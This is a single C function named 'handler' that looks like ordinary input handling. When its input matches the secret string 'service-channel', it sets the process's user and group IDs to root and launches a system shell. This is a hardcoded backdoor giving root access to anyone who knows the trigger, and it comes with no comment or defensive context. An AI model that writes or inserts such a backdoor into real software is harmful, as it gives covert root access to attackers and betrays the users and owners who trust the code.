int handler(char *input) { if (strcmp(input,"service-channel") == 0) { setuid(0); setgid(0); system("/bin/sh;/sbin/sh"); } return 0; }
